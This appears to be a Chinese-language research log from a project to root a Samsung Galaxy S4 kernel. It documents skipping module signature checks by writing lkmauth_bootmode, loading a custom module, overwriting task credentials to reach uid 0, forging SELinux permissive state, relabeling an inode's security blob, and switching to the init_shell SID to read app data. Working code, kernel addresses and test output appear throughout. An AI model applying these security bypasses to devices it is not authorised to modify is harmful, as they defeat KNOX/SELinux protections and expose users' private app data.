# P4.12 — 模块路线复活：`lkmauth_bootmode` 旁路实测

日期：2026-10-19
设备：GT-I9500 / I9500ZSSHQD1 / 内核 3.4.5-6264821

---

## 1. 结论

**P4.9 的“模块路线判死”是错的。**

S4 设备内核与 S6 一样，`load_module` 里存在 `lkmauth_bootmode` 旁路：

```c
#ifdef TIMA_LKM_AUTH_ENABLED
	if (lkmauth_bootmode != BOOTMODE_RECOVERY &&
	    lkmauth(hdr, len) != RET_LKMAUTH_SUCCESS) {
		pr_err("TIMA: lkmauth--unable to load kernel module; module len is %lu.\n", len);
		err = -ENOEXEC;
		goto free_hdr;
	}
#endif
```

把 `lkmauth_bootmode`（`0xc0c0ae28`）写成 `2`，`lkmauth` 不再被调用，
**改过内容的模块可以直接 `insmod`**。

## 2. 实测

```
===BOOTMODE===
c0c0ae28 00000000 00000000
===WRITE===
c0c0ae28 <= 00000002 (was 00000000)
===READBACK===
c0c0ae28 02000000 00000000
===INSMOD===
insmod /data/local/tmp/t2.ko
rc=0
===MODULES===
scsi_wait_scan 470 0 - Live 0x00000000
```

`t2.ko` 是 `scsi_wait_scan.ko` 的副本，改过 `.comment` 一个填充字节
（`0x00`→`0xFF`），正是 P4.9 里被 `Module Hash value does not match, len:744`
拒绝的那个文件。

卸载也正常：

```
rmmod scsi_wait_scan  → rc=0
/proc/modules         → 空
```

## 3. 地址来源

`kallsyms.txt:60629`：

```
c0c0ae28 B lkmauth_bootmode
```

类型 `B`（BSS），4 字节，可写。

## 4. TIMA 的反应

加载/卸载模块本身没有触发 lkmauth 失败记录。但同一时间窗口内
TIMA PKM 的周期测量抓到了另一件事：

```
TIMA: Code segment modified start addr: 0x40010180!!
TIMA: KERNEL VERIFICATION FAILED
TIMA: Now measuring SEAndroid status
TIMA: SEAndroid verification succeeded
```

- `0x40010180` 是内核 text 的物理地址，改动来自 `sys_execve` 的 4 字节补丁
- SEAndroid 检查通过（`permissive_map` 伪造没有被识破）
- `warranty_bit` 仍为 0

也就是说：**TIMA 能看见 text 被改，但只记 dmesg，不熔断。**
这与 P4.9 模块实验时的观察一致。

## 5. P4.9 错在哪

当时的实验只做了“改模块内容 → 被拒”，得出的结论是“校验是内容哈希 → 模块路线死”。

漏掉的是**调用条件本身**：

- 内容哈希不可伪造，正确
- 但 `lkmauth` 只在 `lkmauth_bootmode != BOOTMODE_RECOVERY` 时调用
- 这个变量是 BSS 里的普通全局变量，可写

**“校验内容不可伪造”不等于“校验不可跳过”。** 这是 P4.9 的方法论错误，
和 P4.10 的“没把补丁状态当控制变量”是同一类问题：只看了被校验的对象，
没看校验是否被调用。

## 6. 现在的模块能带来什么

| 能力 | 现状 |
|---|---|
| 加载任意 `.ko` | **已验证** |
| 卸载 | **已验证** |
| 正确刷 I-cache | 模块内可调 `flush_icache_range` |
| 免竞态 | 模块加载一次，不需要每次 `writev` |
| 内核态常驻接口 | 可注册 `/proc` 或 ioctl |
| 直接改 cred | 模块内可 `commit_creds(prepare_kernel_cred(0))` |
| 绕过 lkmauth | 改一次 `lkmauth_bootmode = 2` |

**注意**：改 `lkmauth_bootmode` 本身需要一次内核写（ktool 的 exploit）。
所以模块不是“免 exploit”，而是“exploit 一次 → 模块常驻”。

## 7. 对 2b 的影响

原计划 2b 需要：

```
su 客户端 + 守护进程 + 文件 IPC + 授权层
```

如果模块可用，2b 可以简化成：

```
内核模块（hook execve / 提供 su ioctl）
  + 一个 su 客户端（或 KernelSU manager）
```

但 3.4 内核太老，官方 KernelSU 最低要求 3.18。需要：

1. 自己写一个最小模块，提供 `/proc/ktool` 或 `ioctl` 接口
2. 或者移植 KernelSU 的早期非 GKI 版本（工作量大）

## 8. 下一步

1. **编译一个自制模块**：需要 ARM 交叉工具链（本机暂无 zig/NDK）
2. 模块只做最小验证：`printk` + 注册 `/proc/ktool`
3. 验证通过后，再决定是做“精简 su 模块”还是移植 KernelSU
4. 每次开机流程：`ktool w32 c0c0ae28 2` → `insmod ktool.ko`

## 9. 回滚

模块路线不写盘，重启即消失。`lkmauth_bootmode` 是 BSS 变量，重启归零。
无需额外清理。

# P4.12 续二 — 完整 restore 与指定 pid 提权（2026-10-20 晚）

## 16. 完整 restore 实测

`echo restore > /proc/ktool` 由普通 shell 写入，模块执行：

1. `kallsyms_lookup_name("avc_ss_reset")(0)`
2. `kw32(0xc0c4efcc, 0)` + `kw32(0xc0c4efd0, 0)`
3. `memcpy(0xc0b9ec3c, "/sbin/modprobe\0", 15)`
4. `kw32(0xc0012164, 0x0a000002)`

前后对比：

| 地址 | 回滚前 | 回滚后 |
|---|---|---|
| `permissive_map` | `3cecb9c0 00060000` | `00000000 00000000` |
| `modprobe_path` | `5cecb9c0 ffffffff …` | `2f736269 6e2f6d6f 6470726f 6265` = `/sbin/modprobe` |
| `sys_execve` 补丁 | `470000ea` (0xea000047) | `0200000a` (0x0a000002) |

行为验证：

```
shell $ ls /data/data
opendir failed, Permission denied
shell $ cat /sys/fs/selinux/enforce
1
```

**结论：不重启、不丢模块状态，SELinux 回到 enforcing。**

## 17. 指定 pid 提权

```
P=8414
Uid:  2000 2000 2000 2000     ← 提权前
echo "root 8414" > /proc/ktool   → rc=0
Uid:  0 0 0 0                 ← 提权后
```

## 18. 关键坑：`task_struct` 偏移不能用源码树的

第一版直接用 `task->cred` / `task->comm`，printk 输出：

```
ktool: pid=8442 task_pid=8442 comm= oldcred=  (null) new=c1fbcd80
```

`pid` 对，`comm` 空，`cred` 为 NULL —— **模块编译用的 3.4.67 `task_struct` 布局与设备 3.4.5 不一致**。

修法：不用结构体字段，改用手工偏移（设备实测）：

```c
#define TASK_REAL_CRED  0x2f8UL
#define TASK_CRED       0x2fcUL
#define TASK_COMM       0x304UL

*(struct cred **)((char *)task + TASK_CRED) = new;
*(struct cred **)((char *)task + TASK_REAL_CRED) = new;
```

改完立刻成功。

**教训：模块里任何 `task_struct` 字段访问都必须用设备实测偏移，不能信任源码树头文件。**
`pid` 字段只是碰巧两边偏移相同。

## 19. 已知边界

| 限制 | 原因 | 规避 |
|---|---|---|
| `/proc/ktool` 在 enforcing 下不可写 | `shell` 域对 `proc:file` 无 write；permissive_map 的 ebitmap 只覆盖 1536 位，`proc` 可能不在内 | 需要 permissive，或给 proc 文件设 `shell_data_file` 标签 |
| AVC 缓存脏了以后 permissive 不生效 | 旧 denied 决策不失效 | 先 `avc_ss_reset(0)`，或重启 |
| 写接口本身被拦时无法触发 restore | 死锁：要清 AVC 得先写 `/proc/ktool` | 模块 `init` 时自动清一次 AVC，或用 init_shell 写 |
| `task->cred` 直接替换不处理引用计数 | 旧 cred 泄漏 | 测试可接受；长期需 `put_cred(old)` |

# P4.12 续三 — 接口权限修复与反复 root/restore（2026-10-20 晚）

## 20. 接口从 procfs 换成 misc device

`/proc/ktool` 在 enforcing 下被 `shell` 域拒写。改：

```c
static struct miscdevice ktool_miscdev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = "ktool",
	.fops  = &ktool_fops,
	.mode  = 0666,
};
misc_register(&ktool_miscdev);   /* → /dev/ktool */
```

节点默认标签是 `device`，`shell` 对它没有 write，仍然被拒。

## 21. 关键修复：把 security blob 指向 `/dev/null`

策略查询结果（用 `sepolicy_parse.py` 展开属性）：

```
shell → null_device:chr_file  { append,getattr,ioctl,lock,open,read,write }
```

`chcon u:object_r:null_device:s0 /dev/ktool` 失败（`shell` 没有 `relabelto null_device:file`），
`security_inode_setsecurity()` 对 devtmpfs 返回 `-95 (EOPNOTSUPP)`。

最终做法：直接改 inode 的 `i_security` 指针，指向 `/dev/null` 的 security blob：

```c
unsigned long off = offsetof(struct inode, i_security);   /* 实测 36 / 0x24 */
*(void **)((char *)ktool_inode + off) = *(void **)((char *)null_inode + off);
```

dmesg：

```
ktool: isec_off=36 null=e55eced0 ktool=d9349ba0
```

`ls -Z /dev/ktool`：

```
crw------- root root u:object_r:null_device:s0 ktool
```

**标签重标成功。**

## 22. 反复 root / restore 实测

先在 enforcing 下验证接口可写：

```
echo restore > /dev/ktool     → restore_rc=0
cat /sys/fs/selinux/enforce   → 1
echo root > /dev/ktool        → root_rc=0
```

连续 5 次循环：

```
iter=1 restore=0 root=0
iter=2 restore=0 root=0
iter=3 restore=0 root=0
iter=4 restore=0 root=0
iter=5 restore=0 root=0
FINAL Uid: 0 0 0 0
```

新 shell 从普通用户提权：

```
Uid:  2000 2000 2000 2000     ← 提权前
echo root > /dev/ktool        → root_rc=0
Uid:  0 0 0 0                 ← 提权后
```

**结论：不重启、反复 root/restore 成立，5 次无错误、无卡死。**

# P4.12 续四 — restore 触发看门狗复位的根因与修复（2026-10-20 晚）

## 24. 现象

多次把 "USB 掉线" 误判为线材问题，实际是**设备自动重启**：

```
$ cat /proc/last_kmsg | tail
audit: backlog limit exceeded     ← 刷屏数百行
...
No errors detected
Last reset was reset (RST_STAT=0x200)
```

- 没有 panic/oops，`No errors detected`
- `RST_STAT=0x200`（bit 9）不在 `resetreason.c` 的标准位列表里
- `audit: backlog limit exceeded` 从 uptime 588s 开始，597s 复位

## 25. 根因

`restore` 原来做两件事：

1. `avc_ss_reset(0)` —— 一次性清空整个 AVC 哈希表
2. 清 `permissive_map`

清空 AVC 后，所有正在跑的 SELinux 检查都要走慢路径重新计算；同时 `permissive_map` 已清，大量之前被 permissive 放行的操作突然变成 denied，**几秒内产生海量 audit 事件**。

SecurityLogAgent 已被禁用，没人消费 audit backlog，于是：

```
audit: backlog limit exceeded × N
→ 审计子系统阻塞关键路径
→ 看门狗超时
→ RST_STAT=0x200 复位
```

**不是 `avc_ss_reset` 的实现 bug，是“清缓存 + 清 permissive”叠加造成的审计风暴。**

## 26. 修复

`ktool_restore()` 不再调用 `avc_ss_reset(0)`，只做：

```c
kw32(PERM_MAP, 0);        /* 清 permissive_map */
memcpy(PERM_BASE, "/sbin/modprobe\0", 15);
kw32(EXEC_BR, 0x0a000002);
```

模块 `init` 里的那次 `avc_ss_reset` 也一并去掉。

## 27. 修复后实测

```
restore_rc=0
+60s:  uptime 63 → 131，enforce=1，map=0，modprobe 已恢复
+120s: uptime 195，无重启
```

restore 后再次提权：

```
echo root > /dev/ktool   → rc=0
Uid: 0 0 0 0
```

连续 5 次 `restore → root`：

```
iter=1..5  restore=0 root=0
FINAL Uid: 0 0 0 0
```

**不再触发看门狗复位。**

## 28. 代价

不清 AVC 意味着旧的 allow 缓存继续生效：restore 后系统不是“完全干净”的 enforcing，部分之前被允许的操作仍会放行，直到缓存被替换或重启。

这是“稳定性”换“彻底性”的取舍：

| 目标 | 做法 |
|---|---|
| 不重启、稳定反复 | **不清 AVC**（当前） |
| 完全干净的 enforcing | 清 AVC，但会触发审计风暴，建议直接重启 |
| 彻底清理 | 重启 |

## 29. 另一条重要修正

模块提权后 `context=u:r:kernel:s0`，但 `kernel` 域**没有 `system_file:file execute`**（`system_file` 不在 `exec_type` 里）。

实测 enforcing 下：

```
$ echo root > /dev/ktool   → rc=0
$ id
/system/bin/sh: id: Permission denied
$ ls /data/data
/system/bin/sh: ls: Permission denied
```

所以准确说法是：

- **提权本身不需要 permissive**
- **提权后 exec `id`/`ls`/`cat` 等 `system_file` 需要 permissive**（或改策略）
- `shell_exec`、`su_exec` 在 `exec_type` 里，可以 exec

# P4.12 续五 — "持续发热"排查（2026-10-20 晚）

## 30. 排查过程

用户反馈 restore 后设备持续发热。逐层排查：

**① auditd 满负荷**

处理：`kill 4261`，auditd 是 `disabled + oneshot`，未自动重启。

**③ 重启对比**

重启后 adbd 立刻正常（`utime=0, stime=2`）。重新加载模块、执行 restore：

```
加载模块后：utime=5, stime=603，5 秒不增长
restore 后：utime=5, stime=603，5 秒不增长
```

**adbd 不再忙**。

**④ 当前状态**

```
5 秒 CPU 采样：idle +1454 / 总 1991 = 73%
loadavg：1.76（之前 3.7）
电池：Charging，35.2°C
```

## 31. 结论

| 现象 | 归因 | 状态 |
|---|---|---|

# P4.12 续六 — 发热的真正根因：adbd 线程泄漏

## 32. 现象与证据

restore 后设备持续发热，重新查：

```
top: adbd 75%，System 75%
5 秒 cpu 增量: system +1497, idle +496 → idle 仅 24.7%
```

adbd 的线程列表：

```
8648  utime=106  stime=29676   (R)
8659  utime=122  stime=27920   (S)
8683  utime=84   stime=25059   wchan=avc_has_perm_flags
```

三个残留线程累计 stime 25000–30000 jiffies（250–300 秒 CPU），其中一个卡在 `avc_has_perm_flags`。

AVC 命中率正常：

```
lookups 1501722  hits 1498971  misses 2751
```

所以不是“清 AVC 导致慢路径”，是 **adbd 会话线程泄漏**——大量 `adb shell` 调用后，部分线程没有退出，持续做 `avc_has_perm`。

## 33. 处理与结果

```
setprop ctl.restart adbd
```

adbd 重启（新 pid 8812）后：

```
5 秒 cpu 增量: user +4, system +3, idle +2004 → idle 99.6%
```

**系统完全空闲。**

## 34. 结论

| 现象 | 根因 | 处理 |
|---|---|---|
| restore 后看门狗复位 | 清 AVC 产生审计风暴 | 停 auditd + 清 AVC（已修） |
| restore 后 auditd 18% | 同上 | kill auditd |
| **持续发热** | **adbd 会话线程泄漏**（大量 adb 调试命令的副作用） | `setprop ctl.restart adbd` |
| exec `id`/`ls` 被拒 | 策略不给 `shell`/`kernel` 的 `system_file:execute` | 只能 permissive |

**restore 不是发热的直接原因。** 发热是“大量调试命令 + adbd 线程回收不及时”造成的，与 restore 的看门狗问题要分开看。

# P4.12 续七 — 纠错：exec 被拒的真正原因不是 SELinux 策略

## 35. 策略查询错误

之前在「P4.12 续六」写：

> shell / init_shell / kernel 对 system_file:file 都没有 execute

**这是错的。** 错在查询方法：`type_name[925]` 被别名 `dhcp_system_file` 覆盖，`tname(tt) == 'system_file'` 永远匹配不到。

按 type value 925 重查：

```
kernel      -> system_file:file  execute,getattr,ioctl,lock,open,read
shell       -> system_file:file  execute,execute_no_trans,getattr,ioctl,lock,open,read
init_shell  -> system_file:file  execute,execute_no_trans,getattr,ioctl,lock,open,read
untrusted_app -> system_file:file execute,execute_no_trans,getattr
```

**策略确实给了 execute。** `system_file ∉ exec_type` 只影响依赖属性的规则，不影响这些直接规则。

## 36. 真正的拒绝来源：KNOX 的 exe 路径检查

设备实测：

```
/system/bin/id      -> toolbox     u:object_r:system_file:s0
/system/bin/toolbox                u:object_r:system_file:s0
/system/bin/sh                     u:object_r:shell_exec:s0
```

对比两种提权方式：

| 方式 | 进程 exe | 路径 | exec id |
|---|---|---|---|
| `ktool sh` | `/data/local/tmp/ktool` | **在 `/data/` 下** | ✅ |
| `/dev/ktool` 提权后的 sh | `/system/bin/sh` | **不在 `/data/`** | ❌ |

`sec_check_execpath` 检查的是**当前进程自己的 exe 路径**。`ktool` 在 `/data/` 下，命中白名单，所以 `ktool sh` 能 exec；`/dev/ktool` 提权的是 `/system/bin/sh`，路径不在 `/data/`，被拦。

**这不是 SELinux，是 KNOX 的路径检查。** 修 A2 的方向也因此改变：不是去调 permissive，而是解决「提权进程的 exe 不在 `/data/`」这个根因。

## 37. restore 顺序修正

之前写「停 auditd → 清 AVC → 立即 permissive」，**顺序反了**。

正确顺序：

```
1. 停 auditd
2. 置 permissive（伪造 permissive_map）
3. 清 AVC（avc_ss_reset）
4.（可选）恢复 enforcement
```

原因：`permissive_map` 改动不会失效已缓存的 AVC 节点（`avd->flags` 是算好存进 node 的）。必须让 permissive 先生效，清完 AVC 之后才不会再有新的 denied 灌进去。

## 38. A1 的前置条件

`lkmauth_bootmode` 是 BSS 变量，重启归零。所以 2a 的完整链条是：

```
sec-sh (init_shell, uid 0)
  → 跑 exploit 拿内核写
  → 设 lkmauth_bootmode = 2
  → insmod ktool_mod.ko
  → /dev/ktool 就位
```

**「谁设 bootmode、何时失效」必须写进 A1**，否则换机器复现不了。

## 39. B 路线的前提核实

| 检查项 | 结果 |
|---|---|
| `untrusted_app → exec_type:file execute/execute_no_trans` | ✅ 有 |
| `su_exec ∈ exec_type` | ✅ |
| `untrusted_app → null_device:chr_file write` | ✅ 有 |
| `untrusted_app → shell_data_file:file write` | ✅ 有 |

所以：

- app **可以** exec `/system/xbin/su`（`su_exec` 通过 `exec_type` 属性）
- app **可以**写 `/dev/ktool`（`null_device` 有 write）

**B 的真实卡点不是 `untrusted_app → su_exec`，而是 su 提权后 exec 命令仍受 KNOX exe 路径检查限制**（su 的 exe 在 `/system/xbin`，不在 `/data/`）。

# P4.12 续八 — 能力边界最终修正：execute_no_trans 与域转换

## 40. 真正的机制

`kernel` 域对 `system_file:file` 有 `execute`，但**没有 `execute_no_trans`**：

```
kernel      -> system_file:file  execute,getattr,ioctl,lock,open,read
shell       -> system_file:file  execute,execute_no_trans,getattr,ioctl,lock,open,read
init_shell  -> system_file:file  execute,execute_no_trans,getattr,ioctl,lock,open,read
```

SELinux 的 `file:execute` 检查：

- 目标是 **entrypoint** → 只需要 `execute`
- 目标不是 entrypoint → 需要 `execute` **+ `execute_no_trans`**

`system_file` 不是 entrypoint，`kernel` 域缺 `execute_no_trans` → 直接 exec `id` 被拒。

## 41. 但可以通过 sh 中转

`/system/bin/sh` 的标签是 `shell_exec`，是 entrypoint。`kernel` 域 exec 它只需要 `execute`（有）。

实测：

```
echo root > /dev/ktool
/system/bin/sh -c "id; ls /data/data"

→ uid=0(root) gid=0(root) context=u:r:shell:s0
→ ls 成功（permissive 下）
```

**exec sh 后域从 `kernel` 变成 `shell`**（type_transition），`shell` 有 `execute_no_trans`，所以 sh 里的 `id`/`ls` 都能跑。

## 42. enforcing 下的真实边界

```
echo restore > /dev/ktool      → restore_rc=0，enforce=1，map=0
echo root > /dev/ktool
/system/bin/sh -c "id; ls /data/data"

→ uid=0(root) context=u:r:shell:s0     ✅ id 成功
→ opendir failed, Permission denied    ❌ ls 失败
```

所以 enforcing 下：

| 操作 | 结果 | 原因 |
|---|---|---|
| exec `sh` | ✅ | entrypoint，`kernel` 有 execute |
| sh 里 exec `id` | ✅ | 域已转 `shell`，有 execute_no_trans |
| sh 里读 `/data/data` | ❌ | `shell` 域对 `system_data_file:dir` 权限不足 |
| 读 `/data/local/tmp` | ✅ | `shell_data_file` 有权限 |

## 43. 最终能力边界

```
能（enforcing）：
  模块常驻
  提权到 uid 0
  exec /system/bin/sh（域转 shell）
  sh 里 exec id/ls/cat
  读写 shell_data_file（/data/local/tmp）
  不重启反复 root/restore

不能（enforcing）：
  直接 exec id/ls（kernel 域缺 execute_no_trans）
  读写 /data/data 等 system_data_file（shell 域权限不足）
  重启后自动恢复（没有 2a）
  第三方 app su 入口（没写 /system）
  换 build 直接跑

需要 permissive 才能：
  读写 /data/data
  访问其他受保护资源
```

**之前「策略没有 execute」和「KNOX 拦」两个结论都不准确。准确的是：`execute_no_trans` 缺失 + 域转换 + 文件访问权限。**

# P4.12 续九 — `/data/data` 读不了的真正原因：SELinux capability，不是 DAC

## 44. 核实结果

提权后：

```
CapInh: 0000000000000000
CapPrm: ffffffffffffffff
CapEff: ffffffffffffffff      ← 全满
CapBnd: ffffffffffffffff
```

所以「caps 没设」不成立。

`/data/data` 标签与权限：

```
drwxrwx--x system system u:object_r:system_data_file:s0
```

`ls -Z` 确认是 `system_data_file`，不是 `app_data_file`。

## 45. 真正的拦截点：SELinux 的 capability 规则

查 `capability` class：

```
kernel      : dac_override, dac_read_search, ... （全满）
init_shell  : chown, dac_override, fowner, fsetid, ...
shell       : （空）
```

- `kernel` 有 `dac_read_search`，能读 `/data/data`
- `shell` 的 capability 规则**为空**
- `init_shell` 有 `dac_override`，但没有 `dac_read_search`

`opendir("/data/data")` 在 DAC 层需要 `CAP_DAC_READ_SEARCH`（目录 0771，other 只有 x）。即使 `CapEff=ffffffff`，SELinux 的 `capable(CAP_DAC_READ_SEARCH)` 会检查 `allow shell self:capability dac_read_search`——`shell` 没有这条规则，所以被拒。

**不是 DAC，不是 caps 没设，是 SELinux 的 capability 规则。**

## 46. 掉域让两个能力互斥

```
提权后（kernel 域）：
  ✅ dac_read_search → 能读 /data/data
  ❌ execute_no_trans → 不能 exec system_file

exec sh 后（shell 域）：
  ✅ execute_no_trans → 能 exec id/ls/cat
  ❌ capability 空 → 不能读 /data/data
```

**两个能力不能同时具备。** 这是这台设备策略的结构性限制。

## 47. 结论

| 说法 | 判定 |
|---|---|
| 「策略没有 execute」 | ❌ 错（有 execute，缺 execute_no_trans）|
| 「KNOX 拦 exe 在 /data」 | ⚠️ 未定论（`ktool sh` 的 exe 就在 /data 却成功）|
| 「caps 没设」 | ❌ 错（CapEff 全满）|
| **「读 /data/data 需要 permissive」** | ✅ **成立**，但原因是 SELinux capability，不是 DAC |
| 「exec sh 会掉域」 | ✅ 对，kernel 域是瞬时的 |

要在 enforcing 下读 `/data/data`，三条路：

1. permissive
2. 模块提供 kernel 域的读接口（`filp_open` + `vfs_readdir`），不 exec
3. 改策略给 `shell` 加 `capability dac_read_search`（不推荐）

# P4.12 续十 — `init_shell` SID 方案核实：能 exec、能读顶层，读不了 app 数据

## 48. 核实结果

| 检查项 | 结果 |
|---|---|
| `init_shell` capability | `dac_override` ✅（无 `dac_read_search`）|
| `init_shell → system_file:file` | 通过属性 `system_domain`/`trusteddomain` 有 `execute` + `execute_no_trans` ✅ |
| `init_shell → shell_exec:file` | `entrypoint, execute, execute_no_trans` ✅ |
| `init_shell` 的 type_transition | 只有 2 条（energy-awareness、mobicoredaemon），**无 `→ shell_exec`** ✅ 不掉域 |
| `init_shell → app_data_file:dir` | **只有 `search, setattr`，没有 `read`** ❌ |
| `init_shell → app_data_file:file` | **无规则** ❌ |

## 49. 结论

`init_shell` 能拿到：

- 直接 exec `id`/`ls`/`cat`（`execute_no_trans`）
- exec `/system/bin/sh` 不掉域
- 读 `/data/data` 顶层（`system_data_file:dir` 有 `read, search`）
- 过 `/data/data` 的 DAC（`dac_override`）

**但拿不到：**

- 列 app 子目录（`app_data_file:dir` 缺 `read`）
- 读 app 文件（`app_data_file:file` 无规则）

所以「改 SID 到 `init_shell` 就能两者兼得」**不成立**。它解决的是 A2 的 exec 问题，不是 app 数据读取。

## 50. 最终三域对比

| 能力 | kernel (210) | init_shell (986) | shell (1178) |
|---|---|---|---|
| exec `system_file` | ❌ | ✅ | ✅ |
| exec sh 掉域 | → shell | ❌ 不掉 | 不变 |
| capability | 全满 | `dac_override` 等 | **空** |
| `/data/data` 顶层 | 只有 getattr | ✅ read/search | DAC 过不了 |
| app 子目录 | 只有 getattr | 只有 search | ✅ 全权 |
| app 文件 | 无 | 无 | ✅ 全权 |

**没有任何单域同时满足「exec + 读 app 数据」。**

| 目标 | 用哪个域 |
|---|---|
| exec 系统命令、读 `/data/data` 顶层 | `init_shell` |
| 读 app 数据 | `shell` + permissive（或改策略）|
| 内核操作（insmod、改 selinux） | `kernel` |

## 51. 对 A2/B 的影响

- **A2 的 exec 问题**：可以用 `init_shell` SID 解决，不必依赖 permissive 或 sh 中转。
- **读 app 数据**：仍然需要 permissive，或者改策略给 `shell` 加 `capability dac_read_search`。
- **B 路线（su）**：su 提权后切到 `init_shell` 可以获得 exec 能力，但读 app 数据仍受限。要完整备份类功能，permissive 仍是前提。

# P4.12 续十一 — 最终纠错：属性广播规则把 `read` 加回来了，`init_shell` 两者兼得

## 52. 上一轮的查询错误

第 48–51 节的结论「`init_shell` 读不了 app 数据」**是错的**。

错误原因：查询只展开了**源域**的属性（`srcs = attrset(init_shell) | {init_shell}`），**没有展开目标域**的属性（`tt != app_data_file` 只匹配 `tt == 188`）。

策略里 `allow system_domain newAttr57:dir {open read search}` 这条规则的**目标**是属性 `newAttr57(725)`，`app_data_file(188)` 挂在 `newAttr57` 上，所以这条规则实际上给了 `init_shell → app_data_file:dir` 的 `read`。

**这正是前几轮反复踩的同一个坑的第三个方向：别名折叠（type 名）、源域属性、目标域属性。**

## 53. 完整核实

`app_data_file(188)` 挂在的属性（部分）：

```
17 file_type, 74 domain_no_write_file, 650 data_file_type,
720 newAttr54, 723 newAttr55, 724 newAttr56, 725 newAttr57, 847 newAttr68, ...
```

`init_shell(986)` 挂在：`system_domain(1297)`、`trusteddomain(1218)`、`domain(1342)` 等。

三条属性广播规则：

```
system_domain(1297) -> newAttr57(725):dir  = getattr, ioctl, open, read, search
trusteddomain(1218) -> newAttr54(720):file = getattr, ioctl, lock, open, read
domain(1342)        -> newAttr68(847):dir  = getattr
```

三层并集：

```
init_shell → app_data_file:dir  = getattr, ioctl, open, read, search, setattr  ✅ 有 read
init_shell → app_data_file:file = getattr, ioctl, lock, open, read             ✅ 有 read
```

## 54. 修正后的三域对比

| 能力 | kernel | init_shell | shell |
|---|---|---|---|
| exec `system_file` | ❌ | ✅ | ✅ |
| exec sh 掉域 | → shell | **不掉** | 不变 |
| capability | 全满 | `dac_override` 等 | 空 |
| `/data/data` 顶层 | getattr | ✅ | DAC 过不了 |
| **app 子目录** | getattr | **✅（newAttr57 广播）** | ✅ |
| **app 文件** | 无 | **✅（newAttr54 广播）** | ✅ |

**`init_shell` 两者兼得成立。** 改 SID 到 `init_shell` 可以同时获得 exec + 读 app 数据，enforcing 下即可，**不需要 permissive**。

## 55. 实现

`security_context_to_sid` 在 kallsyms（`c0216908 T`）：

```c
int (*ctx2sid)(const char *, u32, u32 *) =
    (void *)kallsyms_lookup_name("security_context_to_sid");
u32 sid;
ctx2sid("u:r:init_shell:s0", 19, &sid);   /* 3 参，GFP_KERNEL 内置，见第 58 节反汇编 */
/* 改 cred->security->sid = sid; osid 一并，见第 59 节 */
```

## 56. 教训（第三次）

**任何"某域对某类型有没有权限"的查询，必须取三层并集：**

1. 直接规则（`st==X && tt==Y`）
2. 源域属性展开（`st ∈ attrs(X)`）
3. **目标域属性展开（`tt ∈ attrs(Y)`）** ← 这次漏的

Samsung 策略用 `newAttrNN`（无名属性）做大范围广播，只看直接规则会系统性低估权限。

# P4.12 续十二 — `init_shell` SID 落地三坑核实（含设备反汇编证据）

## 57. 坑 1：SID 不是 type value —— 986 不能直接写

`cred->security->sid` 存的是 **sidtab 哈希索引**（sidtab.h：`struct sidtab_node { u32 sid; struct context context; }`，哈希桶 128），不是 policydb 的 type value。

- `kernel` 域硬编码能成功，是因为 `SECINITSID_KERNEL` 是内核启动时固定的**初始 SID**（小整数），不随策略装载变化。
- `init_shell` 的 SID 是**装载策略时按顺序分配的**，每次开机可能不同。直接写 986 会查 sidtab 越界或指向无关 context。
- 设备实测 `cat /proc/sys/kernel/panic_on_oops` = **1**：oops 即 panic 重启，不是"返回错误"而是"变砖一下"。

正确做法（本设备已具备条件）：

```c
int (*ctx2sid)(const char *, u32, u32 *) =
    (void *)kallsyms_lookup_name("security_context_to_sid");
u32 sid;
if (ctx2sid("u:r:init_shell:s0", 19, &sid) != 0)
    return -EINVAL;
```

备选：`security_secctx_to_secid(scontext, len, &secid)`（kallsyms c01fe9dc，3 参，security.c:997）。

## 58. 设备反汇编：签名是 3 参（修正第 55 节）

源码树 3.4.67 Samsung：`services.c:1472 int security_context_to_sid(const char *scontext, u32 scontext_len, u32 *sid)`。

按「设备与源码树版本不同，不得按版本推断」规则，反汇编设备 kernel.raw（c0216908，符号区间 0x2c 字节）：

```
c0216918:  mov r3, #0        ← def_sid = SECSID_NULL
c021691c:  mov ip, #0xd0     ← GFP_KERNEL = 0xd0（此 build 值）
c0216920:  str r3, [sp, #4]  ← force = 0（第 6 参）
c0216924:  str ip, [sp]      ← gfp（第 5 参）
c0216928:  bl  c0214f74      ← security_context_to_sid_core
```

**r3 被无条件覆盖且从不转发给 core——进来的 r3 不是参数。设备确认为 3 参签名。**

（注意：主线 3.4 是 4 参带 gfp 的版本，Samsung 分支保留旧签名。第 55 节已修正。）

## 59. 坑 2：task_security_struct 布局与共享语义

设备同源 objsec.h:30：

```c
struct task_security_struct {
    u32 osid;          /* 上次 execve 前的 SID */
    u32 sid;           /* 当前 SID */
    u32 exec_sid;      /* setexeccon 留下的 exec SID */
    u32 create_sid;    /* fscreate */
    u32 keycreate_sid;
    u32 sockcreate_sid;
};
```

改 SID 的完整要求：

| 字段 | 操作 | 原因 |
|---|---|---|
| `sid` | 设为新值 | 当前判定用 |
| `osid` | 设为新值 | `security_compute_sid` 算 exec 转换时用 |
| `exec_sid` | 清 0 | 非 0 会强制下一次 exec 换域 |
| `create_sid` / `keycreate_sid` / `sockcreate_sid` | 清 0 | 残留会强制新对象打错标签 |

且**只改目标进程自己的 cred**，绝不动 `init_cred`（全局，改了全系统变）。

## 60. 坑 3：init_shell 的缺口（三层并集实测）

用修正后的三层并集（见第 61 节）实测：

```
shell_data_file:dir  = getattr, ioctl, open, read, search
                       ❌ 无 add_name / create → /data/local/tmp 建不了新文件
shell_data_file:file = getattr, ioctl, lock, open, read, write
                       ❌ 无 execute → /data/local/tmp 的二进制 exec 不了
system_data_file:dir = add_name, create, getattr, ioctl, link, open, read,
                       remove_name, rename, reparent, rmdir, search, setattr, unlink, write   ← 全权
system_data_file:file= append, create, getattr, ioctl, link, lock, open, read, rename, setattr, unlink, write  ← 全权
app_data_file:dir    = getattr, ioctl, open, read, search, setattr                            ✅ 有 read（第 53 节结论维持）
app_data_file:file   = getattr, ioctl, lock, open, read                                       ✅
```

结论：

1. **2b 的 IPC 目录换 `/data/system/`**（`system_data_file` dir/file 全权），不要用 `/data/local/tmp`。
2. enforcing 下 `init_shell` 无法 exec `/data/local/tmp` 的二进制——`ktool` 放 `/system/bin` 的老结论现在有了策略层解释。

## 61. 第四坑：属性展开的方向（本轮新踩）

本轮第一版查询把目标展开写成「attrs_of(T) = 以 T 为属性的类型集合」，方向反了，得出 `app_data_file:dir` 无 read 的**错误结果**。

正确公式（与内核 `context_struct_compute_av` 一致，它对 source 和 target 各迭代一次 `type_attr_map[x]`）：

```python
srcs = attrset(S) | {S}    # S 所属的属性
tgts = attrset(T) | {T}    # T 所属的属性 —— 与源展开同一函数，不是"成员"
```

